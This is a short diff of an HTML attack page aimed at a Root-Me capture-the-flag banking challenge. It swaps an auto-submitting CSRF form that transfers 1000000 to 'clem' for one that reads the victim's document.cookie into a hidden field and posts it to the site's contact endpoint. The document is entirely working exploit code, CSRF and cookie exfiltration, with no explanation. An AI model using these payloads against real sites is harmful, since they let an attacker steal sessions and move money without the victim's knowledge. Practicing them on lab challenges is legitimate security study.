@@ -1,8 +1,9 @@
-<form action="https://bankme-1.challenges.pro.root-me.org/transfer" method="post">
-<input name="recipient" value="clem">
-<input name="amount" value="1000000">
+<form action="https://bankme-1.challenges.pro.root-me.org/contact" method="post">
+<input name="member_username" value="clem">
+<input id="cookiespls" name="url" value="">
 <button type="submit">Send</button>
 </form>
 <script>
+document.querySelector('#cookiespls').value = document.cookie;
 document.forms[0].submit();
 </script>
